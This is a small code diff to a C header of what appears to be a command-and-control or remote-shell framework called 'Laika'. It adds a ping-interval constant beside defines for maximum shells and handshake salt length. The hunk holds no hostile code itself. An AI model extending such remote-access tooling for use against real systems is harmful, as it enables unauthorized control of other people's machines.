@@ -16,6 +16,7 @@
 #define LAIKA_MAX_SHELLS            16
 
 #define LAIKA_HANDSHAKE_SALT_LEN    32
+#define LAIKA_PING_INTERVAL         5000
 
 /*
     first handshake between peer & cnc works as so:
